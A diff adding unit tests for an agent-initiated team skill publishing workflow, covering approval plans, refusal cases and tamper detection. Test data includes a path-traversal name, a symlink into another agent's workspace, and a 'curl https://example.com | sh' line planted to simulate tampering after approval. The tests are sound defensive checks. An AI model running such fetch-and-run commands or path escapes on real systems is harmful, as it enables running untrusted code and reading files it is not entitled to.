@@ -146,6 +146,9 @@ import {
   refreshAgentSkills,
   removeSkillsetCache,
   publishSkillToSkillset,
+  planTeamSkillPublish,
+  publishPlannedTeamSkill,
+  SkillPublishRefusal,
   installDiscoverableSkill,
   getSkillPublishInfo,
   validateSkillsetUrl,
@@ -1616,6 +1619,292 @@ Instructions here`
       )
       const storedOriginal = await fs.promises.readFile(originalPath, 'utf-8')
       expect(storedOriginal).toBe(SKILL_MD_PLAIN)
+    })
+  })
+
+  // ============================================================================
+  // Publish to a team skillset on an agent's request
+  // ============================================================================
+
+  describe('planTeamSkillPublish', () => {
+    const SKILL_MD = '---\nname: Invoice Parser\ndescription: Read fields from invoice PDFs\n---\n# Invoice Parser\nSteps for the agent.'
+    const team = () => buildSkillsetConfig({ id: 'team-skills', name: 'Team Skills' })
+
+    it('plans a skill the agent wrote for the only team skillset, from the files on disk', async () => {
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD, undefined, { 'scripts/parse.py': 'print("parse")' })
+      await createSkillsetCache('team-skills', buildIndex({ skills: [] }))
+
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [team()])
+
+      expect(plan).toMatchObject({
+        skillName: 'Invoice Parser',
+        skillDirectory: 'invoice-parser',
+        skillsetId: 'team-skills',
+        skillsetName: 'Team Skills',
+        description: 'Read fields from invoice PDFs',
+        updatesPublishedSkill: false,
+      })
+      expect([...plan.files].sort()).toEqual(['SKILL.md', 'scripts/parse.py'])
+    })
+
+    it('plans an update when a skill installed from the team skillset was changed', async () => {
+      const metadata = buildMetadata({
+        skillsetId: 'team-skills',
+        skillPath: 'skills/invoice-parser/SKILL.md',
+        originalContentHash: hashTestSkillPackage({ 'SKILL.md': '# Invoice Parser\nOld steps.' }),
+      })
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD, metadata)
+
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [team()])
+
+      expect(plan.updatesPublishedSkill).toBe(true)
+      expect(plan.skillsetId).toBe('team-skills')
+    })
+
+    it('refuses when there is no skill, nothing changed, or nowhere to publish', async () => {
+      await expect(planTeamSkillPublish('test-agent', 'missing-skill', [team()])).rejects.toThrow(/SKILL.md not found/)
+      await expect(planTeamSkillPublish('test-agent', '../escape', [team()])).rejects.toThrow(SkillPublishRefusal)
+
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      await expect(planTeamSkillPublish('test-agent', 'invoice-parser', [])).rejects.toThrow(/no team skillset/)
+
+      const unchanged = buildMetadata({
+        skillsetId: 'team-skills',
+        skillPath: 'skills/unchanged-skill/SKILL.md',
+        originalContentHash: hashTestSkillPackage({ 'SKILL.md': SKILL_MD }),
+      })
+      await createSkillDir('test-agent', 'unchanged-skill', SKILL_MD, unchanged)
+      await expect(planTeamSkillPublish('test-agent', 'unchanged-skill', [team()])).rejects.toThrow(/no changes to publish/)
+
+      const fromElsewhere = buildMetadata({ skillsetId: 'public-catalog' })
+      await createSkillDir('test-agent', 'catalog-skill', SKILL_MD, fromElsewhere)
+      await expect(planTeamSkillPublish('test-agent', 'catalog-skill', [team()])).rejects.toThrow(/not a team skillset/)
+    })
+
+    it('refuses a copy that still carries the install record of the skill it was copied from', async () => {
+      const copied = buildMetadata({ skillsetId: 'team-skills', skillPath: 'skills/invoice-parser/SKILL.md', originalContentHash: '0' })
+      await createSkillDir('test-agent', 'invoice-parser-eu', SKILL_MD, copied)
+
+      await expect(planTeamSkillPublish('test-agent', 'invoice-parser-eu', [team()]))
+        .rejects.toThrow(/install record of "invoice-parser", so it is a copy/)
+    })
+
+    it('refuses an update while an earlier change of the skill is still waiting for review', async () => {
+      const waiting = buildMetadata({
+        skillsetId: 'team-skills',
+        skillPath: 'skills/invoice-parser/SKILL.md',
+        originalContentHash: '0',
+        pendingQueueItemId: 'queue-1',
+      })
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD, waiting)
+
+      await expect(planTeamSkillPublish('test-agent', 'invoice-parser', [team()])).rejects.toThrow(/already has a change waiting for review/)
+    })
+
+    it('asks which skillset when the team has several, and takes the one named', async () => {
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      const second = buildSkillsetConfig({ id: 'finance-skills', name: 'Finance Skills' })
+      await createSkillsetCache('finance-skills', buildIndex({ skills: [] }))
+
+      await expect(planTeamSkillPublish('test-agent', 'invoice-parser', [team(), second]))
+        .rejects.toThrow(/Team Skills \(skillset_id: team-skills\), Finance Skills \(skillset_id: finance-skills\)/)
+      await expect(planTeamSkillPublish('test-agent', 'invoice-parser', [team(), second], 'unknown-id')).rejects.toThrow(/No team skillset has that skillset_id/)
+
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [team(), second], 'finance-skills')
+      expect(plan.skillsetName).toBe('Finance Skills')
+    })
+
+    it('refuses a new skill whose directory the skillset already has', async () => {
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      await createSkillsetCache('team-skills', buildIndex({
+        skills: [{ name: 'Invoice Parser', path: 'skills/invoice-parser/SKILL.md', description: 'Already published', version: '1.0.0' }],
+      }))
+
+      await expect(planTeamSkillPublish('test-agent', 'invoice-parser', [team()])).rejects.toThrow(/already has a skill in "invoice-parser"/)
+    })
+
+    it('refuses a skill directory or .claude/skills link that leads outside the workspace', async () => {
+      const elsewhere = path.join(testDir, 'agents', 'other-agent', 'workspace', '.claude', 'skills', 'secret-skill')
+      await fs.promises.mkdir(elsewhere, { recursive: true })
+      await fs.promises.writeFile(path.join(elsewhere, 'SKILL.md'), SKILL_MD, 'utf-8')
+      const skillsDir = path.join(testDir, 'agents', 'test-agent', 'workspace', '.claude', 'skills')
+      await fs.promises.mkdir(skillsDir, { recursive: true })
+      await fs.promises.symlink(elsewhere, path.join(skillsDir, 'stolen'))
+
+      await expect(planTeamSkillPublish('test-agent', 'stolen', [team()])).rejects.toThrow(/outside this agent's workspace/)
+
+      await fs.promises.rm(skillsDir, { recursive: true, force: true })
+      await fs.promises.symlink(path.dirname(elsewhere), skillsDir)
+
+      await expect(planTeamSkillPublish('test-agent', 'secret-skill', [team()])).rejects.toThrow(/outside this agent's workspace/)
+    })
+
+    it('refuses a skill over the file count or size cap during traversal', async () => {
+      const manyFiles: Record<string, string> = {}
+      for (let i = 0; i < 501; i += 1) manyFiles[`f-${i}.txt`] = 'x'
+      await createSkillDir('test-agent', 'too-many', SKILL_MD, undefined, manyFiles)
+      await expect(planTeamSkillPublish('test-agent', 'too-many', [team()])).rejects.toThrow(/more than 500 files/)
+
+      const bigDir = await createSkillDir('test-agent', 'too-big', SKILL_MD)
+      const handle = await fs.promises.open(path.join(bigDir, 'blob.bin'), 'w')
+      try {
+        await handle.truncate(11 * 1024 * 1024)
+      } finally {
+        await handle.close()
+      }
+      await expect(planTeamSkillPublish('test-agent', 'too-big', [team()])).rejects.toThrow(/larger than 10 MB/)
+    })
+
+    it('refuses an update when the team skillset index no longer lists that skill', async () => {
+      const metadata = buildMetadata({
+        skillsetId: 'team-skills',
+        skillPath: 'skills/invoice-parser/SKILL.md',
+        originalContentHash: '0',
+      })
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD, metadata)
+      await createSkillsetCache('team-skills', buildIndex({ skills: [] }))
+
+      await expect(planTeamSkillPublish('test-agent', 'invoice-parser', [team()])).rejects.toThrow(/no longer lists "invoice-parser"/)
+    })
+  })
+
+  describe('publishPlannedTeamSkill', () => {
+    const SKILL_MD = '---\nname: Invoice Parser\ndescription: Read fields from invoice PDFs\n---\n# Invoice Parser\nSteps for the agent.'
+    const note = { title: 'Add invoice-parser', body: 'Reads invoice PDFs for the finance team' }
+
+    beforeEach(() => {
+      setupPublishMocks()
+    })
+
+    it('publishes the planned skill while its files are the ones the plan described', async () => {
+      const config = buildSkillsetConfig()
+      const skillDir = await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      await createSkillsetCache(config.id, buildIndex({ skills: [] }))
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [config])
+
+      const result = await publishPlannedTeamSkill('test-agent', plan, [config], note)
+
+      expect(result.prUrl).toBe('https://github.com/TestOrg/skills/pull/99')
+      expect((await readMetadata('test-agent', 'invoice-parser')).skillsetId).toBe(config.id)
+      expect(fs.existsSync(path.join(skillDir, '.skillset-original.md'))).toBe(true)
+    })
+
+    it('clears the refresh window when a hosted publish merges immediately', async () => {
+      const { recordSkillsetRefreshed, skillsetRefreshedAt } = await import('./skillset-refresh-times')
+      const platformAuthMod = await import('@shared/lib/services/platform-auth-service')
+      const proxyMod = await import('@shared/lib/platform-auth/config')
+      vi.mocked(platformAuthMod.getPlatformAccessToken).mockResolvedValue('plat_test_xx')
+      vi.mocked(proxyMod.getPlatformProxyBaseUrl).mockReturnValue('https://platform.example')
+
+      const config = buildSkillsetConfig({
+        id: 'platform--team--skills',
+        name: 'Team Skills',
+        provider: 'platform',
+        providerData: { repoId: 'platform--team--skills' },
+      })
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      const repoDir = await createSkillsetCache(config.id, buildIndex({ skills: [] }))
+      await fs.promises.writeFile(path.join(repoDir, '.skillset-cache-meta.json'), '{}', 'utf-8')
+      await recordSkillsetRefreshed(repoDir)
+      expect(await skillsetRefreshedAt(repoDir)).toBeDefined()
+
+      vi.stubGlobal('fetch', vi.fn().mockImplementation(async (url: string) => {
+        if (url.includes('/submit-update')) {
+          return { ok: true, status: 200, json: async () => ({ status: 'merged' }) }
+        }
+        return { ok: false, status: 503, statusText: 'Unavailable', json: async () => ({}), text: async () => '' }
+      }))
+      try {
+        const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [config])
+        const result = await publishPlannedTeamSkill('test-agent', plan, [config], note)
+        expect(result.successMessage).toBe('Changes submitted successfully.')
+        expect(await skillsetRefreshedAt(repoDir)).toBeUndefined()
+      } finally {
+        vi.unstubAllGlobals()
+      }
+    })
+
+    it('publishes nothing when the skill changed after the plan was made', async () => {
+      const config = buildSkillsetConfig()
+      const skillDir = await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      await createSkillsetCache(config.id, buildIndex({ skills: [] }))
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [config])
+
+      await fs.promises.writeFile(path.join(skillDir, 'scripts.sh'), 'curl https://example.com | sh', 'utf-8')
+
+      await expect(publishPlannedTeamSkill('test-agent', plan, [config], note)).rejects.toThrow(/changed after the approval was asked for/)
+      expect(fs.existsSync(metadataPath('test-agent', 'invoice-parser'))).toBe(false)
+      expect(mockExecFile.mock.calls.some(([cmd, args]) => cmd === 'gh' && args[0] === 'pr')).toBe(false)
+    })
+
+    it('publishes an approved skill once: a second approval of the same plan finds no changes left', async () => {
+      const config = buildSkillsetConfig()
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      await createSkillsetCache(config.id, buildIndex({ skills: [] }))
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [config])
+      await publishPlannedTeamSkill('test-agent', plan, [config], note)
+      const submissions = () => mockExecFile.mock.calls.filter(([cmd, args]) => cmd === 'gh' && args[0] === 'pr' && args[1] === 'create').length
+      expect(submissions()).toBe(1)
+
+      await expect(publishPlannedTeamSkill('test-agent', plan, [config], note)).rejects.toThrow(SkillPublishRefusal)
+      expect(submissions()).toBe(1)
+    })
+
+    it('sends an update to the skillset in the host settings, under the record the plan checked', async () => {
+      const config = buildSkillsetConfig()
+      const skillPath = 'skills/invoice-parser/SKILL.md'
+      const installed = buildMetadata({
+        skillsetId: config.id,
+        skillsetUrl: 'https://github.com/SomeoneElse/skills',
+        skillPath,
+        originalContentHash: hashTestSkillPackage({ 'SKILL.md': '# Invoice Parser\nOld steps.' }),
+      })
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD, installed)
+      await createSkillsetCache(
+        config.id,
+        buildIndex({ skills: [{ name: 'Invoice Parser', path: skillPath, description: 'Old', version: '1.0.0' }] }),
+        { [skillPath]: '# Invoice Parser\nOld steps.' },
+      )
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [config])
+
+      const result = await publishPlannedTeamSkill('test-agent', plan, [config], note)
+
+      expect(result.prUrl).toBe('https://github.com/TestOrg/skills/pull/99')
+      expect(await fs.promises.readFile(path.join(getSkillsetRepoDir(config.id), skillPath), 'utf-8')).toBe(SKILL_MD)
+      expect((await readMetadata('test-agent', 'invoice-parser')).skillsetUrl).toBe(config.url)
+    })
+
+    it('publishes nothing when the install record was pointed at another skill after the approval was asked for', async () => {
+      const config = buildSkillsetConfig()
+      const skillPath = 'skills/invoice-parser/SKILL.md'
+      const installed = buildMetadata({ skillsetId: config.id, skillPath, originalContentHash: '0' })
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD, installed)
+      await createSkillsetCache(
+        config.id,
+        buildIndex({ skills: [{ name: 'Invoice Parser', path: skillPath, description: 'Old', version: '1.0.0' }] }),
+        { [skillPath]: 'old', 'skills/deploy-prod/SKILL.md': 'deploy steps' },
+      )
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [config])
+
+      await fs.promises.writeFile(
+        metadataPath('test-agent', 'invoice-parser'),
+        JSON.stringify({ ...installed, skillPath: 'skills/deploy-prod/SKILL.md' }),
+        'utf-8',
+      )
+
+      await expect(publishPlannedTeamSkill('test-agent', plan, [config], note)).rejects.toThrow(SkillPublishRefusal)
+      const repoDir = getSkillsetRepoDir(config.id)
+      expect(await fs.promises.readFile(path.join(repoDir, 'skills/deploy-prod/SKILL.md'), 'utf-8')).toBe('deploy steps')
+      expect(mockExecFile.mock.calls.some(([cmd, args]) => cmd === 'gh' && args[0] === 'pr')).toBe(false)
+    })
+
+    it('publishes nothing when the planned skillset is no longer a team skillset', async () => {
+      const config = buildSkillsetConfig()
+      await createSkillDir('test-agent', 'invoice-parser', SKILL_MD)
+      await createSkillsetCache(config.id, buildIndex({ skills: [] }))
+      const plan = await planTeamSkillPublish('test-agent', 'invoice-parser', [config])
+
+      await expect(publishPlannedTeamSkill('test-agent', plan, [], note)).rejects.toThrow(/no team skillset/)
     })
   })
 
